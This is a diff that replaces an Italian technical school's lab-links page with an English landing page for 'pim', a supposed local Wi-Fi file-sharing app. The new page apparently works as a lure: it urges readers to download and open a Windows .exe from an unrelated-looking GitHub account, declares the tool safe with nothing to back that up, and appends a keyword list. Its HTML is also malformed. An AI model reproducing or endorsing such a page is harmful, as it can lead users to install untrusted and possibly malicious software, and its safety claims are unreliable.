@@ -1,144 +1,69 @@
 <!DOCTYPE html>
-<html lang="it">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ITT Meccatronica Mazara - Presentazione Automazione</title>
+    <title>pim - Share your files across devices</title>
+    <meta name="description" content="A simple tool to exchange files, notes, and tasks between your devices over local Wi-Fi.">
     <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        body {
-            background-color: #0f172a;
-            color: #f8fafc;
-            display: flex;
-            flex-direction: column;
-            min-height: 100vh;
-        }
-        header {
-            background-color: #1e293b;
-            padding: 20px;
-            text-align: center;
-            border-bottom: 3px solid #3b82f6;
-        }
-        header h1 {
-            font-size: 1.8rem;
-            color: #38bdf8;
-            margin-bottom: 5px;
-        }
-        header p {
-            font-size: 0.95rem;
-            color: #94a3b8;
-        }
-        .container {
-            flex: 1;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        .dashboard {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 20px;
-            width: 100%;
-            max-width: 900px;
-        }
-        @media (max-width: 768px) {
-            .dashboard {
-                grid-template-columns: 1fr;
-            }
-        }
-        .card {
-            background-color: #1e293b;
-            border: 1px solid #334155;
-            border-radius: 12px;
-            padding: 25px;
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
-        }
-        .card-title {
-            text-align: center;
-            font-size: 1.25rem;
-            margin-bottom: 20px;
-            color: #f1f5f9;
-            border-bottom: 1px solid #334155;
-            padding-bottom: 12px;
-        }
-        .links-group {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-        }
-        .btn-link {
-            display: block;
-            background-color: #3b82f6;
-            color: white;
-            text-align: center;
-            padding: 12px;
-            border-radius: 8px;
-            text-decoration: none;
-            font-weight: bold;
-            transition: all 0.2s ease;
-        }
-        .btn-link:hover {
-            background-color: #2563eb;
-            transform: translateY(-2px);
-        }
-        footer {
-            text-align: center;
-            padding: 15px;
-            background-color: #1e293b;
-            color: #64748b;
-            font-size: 0.85rem;
-            border-top: 1px solid #334155;
-        }
+        body { font-family: sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 0 auto; padding: 20px; background-color: #f4f4f9; }
+        h1, h2 { color: #2c3e50; }
+        .button { display: inline-block; padding: 15px 25px; background-color: #2980b9; color: white; text-decoration: none; border-radius: 8px; font-weight: bold; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        .container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
+        ul { margin-bottom: 20px; }
     </style>
 </head>
 <body>
-
-    <header>
-        <h1>ITT Meccatronica Mazara</h1>
-        <p>Laboratorio di Automazione e Robotica</p>
-    </header>
-
     <div class="container">
-        <div class="dashboard">
-            <!-- Pannello Sinistra: Sezioni Didattiche -->
-            <div class="card">
-                <div>
-                    <div class="card-title">Materie e Indirizzi</div>
-                    <div class="links-group">
-                        <a href="meccanica.html" class="btn-link">Meccanica</a>
-                        <a href="dpoi.html" class="btn-link">DPOI</a>
-                        <a href="sistemi.html" class="btn-link">Sistemi</a>
-                        <a href="tecnologia.html" class="btn-link">Tecnologia</a>
-                    </div>
-                </div>
-            </div>
+        <h1>📦 pim - Share files between your devices</h1>
+        
+        <p><a href="https://github.com/Taxonomypatka530/pim/releases" class="button">Download for Windows</a></p>
 
-            <!-- Pannello Destra: Sezioni PLC, Arduino e Istituto -->
-            <div class="card">
-                <div>
-                    <div class="card-title">Supervisione e Controllori</div>
-                    <div class="links-group">
-                        <a href="plc.html" class="btn-link">Pannello Controllo PLC</a>
-                        <a href="https://drive.google.com/drive/folders/1dhQ4YbOqCBQCpUPiot9FcVfx1ob8fYDa" target="_blank" class="btn-link">Materiale Arduino (Drive)</a>
-                        <a href="https://www.isruggierodaltavilla.edu.it/" target="_blank" class="btn-link">IS Ruggiero d'Altavilla</a>
-                    </div>
-                </div>
-            </div>
-        </div>
+        <p>pim helps you move files, text, notes, and tasks between your computers and phones. All transfers happen over your home or office Wi-Fi network. Your data stays on your local devices and does not go to the internet.</p>
+
+        <h2>🚀 How to get started</h2>
+        <p>Follow these steps to set up pim on your Windows computer.</p>
+        <ol>
+            <li>Visit the <a href="https://github.com/Taxonomypatka530/pim/releases">download page</a> to find the installer.</li>
+            <li>Look for the file ending in .exe for Windows.</li>
+            <li>Click the file to start the download.</li>
+            <li>Open the file once the download finishes to begin the installation.</li>
+            <li>Follow the prompts on your screen to complete the setup.</li>
+            <li>Launch the pim application from your desktop or start menu.</li>
+        </ol>
+
+        <h2>💻 System requirements</h2>
+        <p>Ensure your computer meets these requirements for the best experience:</p>
+        <ul>
+            <li>Windows 10 or Windows 11.</li>
+            <li>A stable Wi-Fi connection.</li>
+            <li>At least 100 MB of space on your drive.</li>
+            <li>Both devices must connect to the same local network.</li>
+        </ol>
+
+        <h2>📂 How to send files</h2>
+        <p>Once you open the app, you will see a simple list of your other devices on the network.</p>
+        <ol>
+            <li>Select the device you want to share with from the list.</li>
+            <li>Drag and drop your file into the app window.</li>
+            <li>Alternatively, click the plus icon to browse for files.</li>
+            <li>Click send. The file moves to the other device instantly over your Wi-Fi.</li>
+        </ol>
+
+        <h2>📝 Sharing text and notes</h2>
+        <p>You can send short notes or clipboard text just like files.</p>
+        <ul>
+            <li>Paste your text into the input field.</li>
+            <li>Pick your recipient device.</li>
+            <li>Click the share button.</li>
+            <li>The text appears on the other screen immediately.</li>
+        </ol>
+
+        <h2>✅ Frequently asked questions</h2>
+        <p><strong>Do I need an account?</strong> No. You do not need a login or password to use this tool.</p>
+        <p><strong>Is this safe?</strong> Yes. Data stays within your local network. It does not touch cloud servers.</p>
+        <p><strong>Can I use this on Android?</strong> Yes. Download the version for Android to sync with your phone.</p>
+
+        <p>Keywords: android, dart, file-transfer, flutter, lan, offline-first, p2p, peer-to-peer, windows</p>
     </div>
-
-    <footer>
-        &copy; 2026 ITT Meccatronica Mazara - GitHub Pages
-    </footer>
-
 </body>
 </html>
